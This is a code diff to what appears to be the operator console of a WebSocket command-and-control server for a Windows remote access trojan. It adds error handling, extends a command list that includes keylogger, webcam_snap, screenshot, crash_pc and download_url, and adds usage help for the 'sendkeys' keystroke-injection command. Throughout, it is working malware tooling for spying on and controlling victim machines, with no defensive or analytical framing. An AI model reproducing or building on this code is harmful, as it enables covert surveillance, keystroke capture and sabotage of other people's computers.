@@ -87,6 +87,8 @@ wss.on('connection', function connection(ws) {
 				}else if(JSON.parse(message.replace("##MESSAGE##","")).type == "info"){
 					console.log("[".bold + "i".yellow + "] ".bold + JSON.parse(message.replace("##MESSAGE##","")).message.bold);
 				}
+			}else if(message.startsWith("##ERROR##")){
+					console.log("[".bold + "-".red + "] ".bold + message.replace("##ERROR##","").bold);
 			}else if (message.startsWith("hello")) {
 				workingDir = message.substring(message.indexOf("##") + 2, message.lastIndexOf("##"));
 				rl.setPrompt(workingDir + "> ");
@@ -146,7 +148,7 @@ function findSessionNumber(SS, SE){
 }
 
 function suggestions(line) {
-	const completions = 'win_help exit help speedtest sessions background get_user_infos keylogger set_state list_users list_files list_disks crash_pc upload_file screenshot download_url webcam_snap dir assoc at attrib bootcfg cd chdir chkdsk cls copy del dir diskpart driverquery echo exit fc find findstr for fsutil ftype getmac goto if ipconfig md mkdir more move net netsh netstat path pathping pause ping popd pushd powercfg reg rd rmdir ren rename sc schtasks set sfc shutdown sort start subst systeminfo taskkill tasklist tree type vssadmin xcopy'.split(' ');
+	const completions = 'win_help exit help speedtest sessions background get_user_infos keylogger sendkey ppal set_state list_users list_files list_disks crash_pc upload_file screenshot download_url webcam_snap dir assoc at attrib bootcfg cd chdir chkdsk cls copy del dir diskpart driverquery echo exit fc find findstr for fsutil ftype getmac goto if ipconfig md mkdir more move net netsh netstat path pathping pause ping popd pushd powercfg reg rd rmdir ren rename sc schtasks set sfc shutdown sort start subst systeminfo taskkill tasklist tree type vssadmin xcopy'.split(' ');
 	const hits = completions.filter((c) => c.startsWith(line));
 	return [hits.length ? hits : completions, line];
 }
@@ -161,7 +163,20 @@ rl.on('line', (line) => {
 			console.log("[".bold + "+".blue + "] Speed testing...".bold);
 			sessions[currentSession].send(msg);
 		} else if (msg.startsWith("sendkeys")) {
-			sessions[currentSession].send(msg);
+			if(msg.split(' ').length > 1){
+				sessions[currentSession].send(msg);
+			}else{
+				console.log("[".white + "-".red + "]".white + " Wrong arguments !".red + " Usage : ".bold + "sendkeys <keys>");
+				console.log("[".white + "i".yellow + "]".white + " Examples : ".bold + "sendkeys {F4}");
+					console.log("              sendkeys {A}");
+					console.log("              sendkeys ABC");
+					console.log("              sendkeys {F1}ABC{ENTER}");
+					console.log("              sendkeys ^{C}");
+					console.log("              ^ = ctrl");
+					console.log("              % = alt");
+					console.log("              + = shift");
+				rl.prompt();
+			}
 		} else if (msg.startsWith("ppal")) {
 			sessions[currentSession].send("ppal");
 		} else if (msg.startsWith("keylogger")) {
